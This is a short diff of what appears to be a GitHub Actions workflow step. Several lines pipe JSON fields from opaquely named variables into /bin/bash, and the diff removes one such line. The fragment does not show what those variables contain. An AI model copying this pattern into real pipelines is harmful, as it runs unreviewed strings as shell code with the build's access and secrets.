@@ -20,7 +20,6 @@ jobs:
           echo $kttk4 | jq -r .imn1 | /bin/bash
           echo $nr5305 | jq -r .brie24491 | /bin/bash
           printf '%s' "$fs20" | jq -r .itpwk6032 | /bin/bash
-          echo $pqmud17 | jq -r .u98852 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
